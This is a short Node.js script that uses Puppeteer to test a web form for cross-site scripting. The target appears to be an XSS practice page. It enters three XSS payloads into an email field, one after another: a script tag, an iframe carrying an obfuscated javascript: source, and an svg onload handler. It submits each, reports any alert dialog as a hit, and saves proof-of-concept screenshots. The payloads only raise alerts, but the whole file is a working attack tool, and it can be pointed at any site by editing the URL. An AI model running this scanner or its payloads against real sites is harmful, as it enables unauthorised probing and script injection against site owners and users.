const pt = require('puppeteer');  //import the pupeeter library as pt
const url = ('http://sudo.co.il/xss/level0.php');  //ENTER THE TARGETTED URL

function delay(time) {
    return new Promise(function(resolve) {  //function to set a timeout between payload
        setTimeout(resolve, time)
    });
 }

async function alertFinder(){  //main function
    const browser = await pt.launch({headless:false});  //launch browser in headless mode to see the action of the script
    const page = await browser.newPage();  //create a new page inside the browser

	//ENTER THE POSSIBLES OUTPUTS
    console.log('made with <3 by @natekali');
    console.log("---------------------------------------------------");
    console.log('1 : <script> XSS | 2 : <iframe> XSS | 3 : <svg> XSS');  
    console.log("---------------------------------------------------");

    //handle the browser pop-up 
    page.on('dialog', async popup => {
        console.log('Vulnerable to n°' + popup.message());
        console.log("------------------");
        await popup.accept();
    })

    await page.goto(url);  //go to the targetted url
    await page.setViewport({ width: 1920, height: 1080 });   //set the dimension of our screen

    //payload n°1
    await delay(1000);
    await page.$eval('input[name=email]', el => el.value = ("<script>alert(1)</script>"));  //PAYLOAD INPUT N°1
    await page.$eval('input[type=submit]', bl => bl.click());  //submit button -> click
    await page.screenshot({path: 'PoC1.png'});  //screen of the after execution for the proof-of-concept

    //payload n°2
    await delay(1000);
    await page.goto(url);
    await page.$eval('input[name=email]', el => el.value = ("<iframe %00 src='&Tab;javascript:alert(2)&Tab;'%00>"));  //PAYLOAD INPUT N°2
    await page.$eval('input[type=submit]', bl => bl.click());  //submit
    await page.screenshot({path: 'PoC2.png'});  //screen

    //payload n°3
    await delay(1000);
    await page.goto(url);
    await page.$eval('input[name=email]', el => el.value = ("<svg/onload=alert(3)>"));  //PAYLOAD INPUT N°3
    await page.$eval('input[type=submit]', bl => bl.click());    //submit
    await page.screenshot({path: 'PoC3.png'});    //screen

    await delay(1000);
    await browser.close();   //close browser
}

alertFinder();  //call and execute the main function